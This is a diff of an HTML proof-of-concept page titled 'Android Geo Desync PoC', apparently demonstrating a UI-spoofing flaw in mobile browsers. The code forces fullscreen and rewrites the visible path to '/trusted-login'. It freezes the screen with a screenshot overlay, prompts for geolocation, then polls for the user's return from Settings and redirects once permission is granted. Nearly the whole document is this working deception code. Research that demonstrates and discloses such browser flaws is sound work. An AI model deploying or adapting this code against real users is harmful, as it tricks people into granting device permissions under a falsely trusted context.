@@ -4,9 +4,7 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Android Geo Desync PoC</title>
-
 <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
-
 <style>
 body {
   margin:0;
@@ -25,25 +23,20 @@ button {
 }
 </style>
 </head>
-
 <body>
 
-<button id="start">Start Demo</button>
+<button id="start">Start Demos</button>
 
 <script>
 const TARGET = "https://google.com";
+let waitingForReturn = false;
 
-// logging optional
-function log(type){
-  console.log(type);
-}
-
-// freeze UI
+// Freeze UI overlay
 function freezeUI() {
-  return html2canvas(document.body,{scale:2}).then(canvas=>{
+  return html2canvas(document.body, {scale:2, useCORS:true}).then(canvas=>{
     const img = document.createElement("img");
-    img.src = canvas.toDataURL();
-    Object.assign(img.style,{
+    img.src = canvas.toDataURL("image/png");
+    Object.assign(img.style, {
       position:"fixed",
       top:"0",
       left:"0",
@@ -56,55 +49,59 @@ function freezeUI() {
   });
 }
 
-// request location
+// Request Geolocation
 function requestGeo() {
+  waitingForReturn = true;
   navigator.geolocation.getCurrentPosition(
-    () => {
-      log("granted");
-      location.replace(TARGET);
-    },
-    () => {
-      log("denied");
-    }
+    () => location.replace(TARGET),
+    () => {} // user denied
   );
 }
 
-// 🔥 detect user kembali dari settings
-document.addEventListener("visibilitychange", () => {
-  if (document.visibilityState === "visible") {
-    log("back_from_settings");
+// Check permission state
+function tryRedirect() {
+  if (!navigator.permissions) return;
+  navigator.permissions.query({name:'geolocation'}).then(res=>{
+    if(res.state === "granted"){
+      location.replace(TARGET);
+    }
+  });
+}
 
-    // cek permission lagi
-    navigator.permissions?.query({name:'geolocation'}).then(res=>{
-      if(res.state === "granted"){
-        location.replace(TARGET);
-      }
-    });
+// Polling untuk deteksi balik dari Settings
+function startPolling() {
+  let tries = 0;
+  const interval = setInterval(()=>{
+    tryRedirect();
+    tries++;
+    if(tries>20) clearInterval(interval); // ~10 detik
+  },500);
+}
+
+// Event ketika user balik dari Settings
+document.addEventListener("visibilitychange", ()=>{
+  if(document.visibilityState==="visible" && waitingForReturn){
+    startPolling();
   }
 });
+window.addEventListener("focus", ()=>{ if(waitingForReturn) startPolling(); });
+window.addEventListener("pageshow", ()=>{ if(waitingForReturn) startPolling(); });
 
-// start
-document.getElementById("start").onclick = () => {
-
+// Start PoC
+document.getElementById("start").onclick = ()=>{
   // fullscreen
-  if (document.documentElement.requestFullscreen) {
+  if(document.documentElement.requestFullscreen){
     document.documentElement.requestFullscreen();
   }
 
   // spoof path
   history.replaceState({}, '', '/trusted-login');
 
-  // freeze UI dulu
+  // freeze UI
   freezeUI().then(()=>{
-
-    // delay dikit biar overlay ready
-    setTimeout(()=>{
-      requestGeo();
-    },100);
-
+    setTimeout(()=>{ requestGeo(); },100);
   });
 };
-
 </script>
 
 </body>
